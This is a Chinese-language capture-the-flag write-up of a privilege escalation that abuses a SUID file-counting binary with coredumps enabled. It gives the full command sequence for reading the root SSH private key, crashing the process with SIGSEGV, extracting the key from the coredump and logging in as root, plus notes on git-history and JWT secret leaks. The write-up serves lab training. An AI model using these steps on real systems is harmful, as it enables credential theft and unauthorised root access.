Phase 2

权限提升：SUID Coredump 泄露 Root 私钥

$ find / -perm -4000 -ls 2>/dev/null
-rwsr-xr-x 1 root root /opt/count
漏洞链分析（code.c） 1. 以 root 权限读取文件内容（SUID）→ 内容留在内存中
2. setuid(getuid()) 降权回普通用户
3. prctl(PR_SET_DUMPABLE, 1) 手动启用 coredump（致命错误！Linux 默认在降权后禁止 coredump）
4. 等待用户输入（程序暂停，内存中仍有敏感数据）
5. 发送 SIGSEGV → 崩溃 → coredump → 提取数据
🧒 儿童版 — 打晕保安翻笔记本这个程序就像一个保安，有权进保险柜（root 权限）。他把文件内容抄到笔记本上（内存），然后交出钥匙（降权），但笔记本还在手里。你趁他发呆时把他打晕（SIGSEGV），捡起掉落的笔记本（coredump）翻看内容。
# 终端 1：运行程序读取 root 私钥
$ /opt/count
Enter source file/directory name: /root/.ssh/id_rsa
Total characters = 2602
Total words      = 45
Total lines      = 39
Save results a file? [y/N]:
# 不要回答！Ctrl+Z 挂起

# 终端 2：发送崩溃信号
$ kill -SIGSEGV $(ps -e | grep count | awk '{print $1}')

# 终端 1：回到前台让进程崩溃
$ fg
Segmentation fault (core dumped)

# 从 coredump 提取私钥
$ apport-unpack /var/crash/_opt_count.1000.crash /tmp/crash_unpacked
$ strings /tmp/crash_unpacked/CoreDump | grep -A 30 "BEGIN OPENSSH"
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbm...
$ chmod 600 id_rsa
$ ssh -i id_rsa root@10.129.52.183
root@secret:~# cat root.txt

知识点总结

Git 历史泄露敏感信息。

git log + git show 查看已删除的提交。JWT Secret、API Key、密码都可能藏在历史里。

JWT Secret 泄露 = 伪造任意身份。

用泄露的 Secret 签名任意 Payload，服务端无法区分真假 Token。

prctl(PR_SET_DUMPABLE, 1) 是致命错误。

Linux 默认在 SUID 降权后禁止 coredump。手动启用等于把 root 读取的数据暴露给普通用户。

信号控制：Ctrl+Z 挂起 → kill -SIGSEGV → fg 崩溃。

三步操作让 SUID 程序在内存中保留敏感数据的状态下崩溃，生成可分析的 coredump。
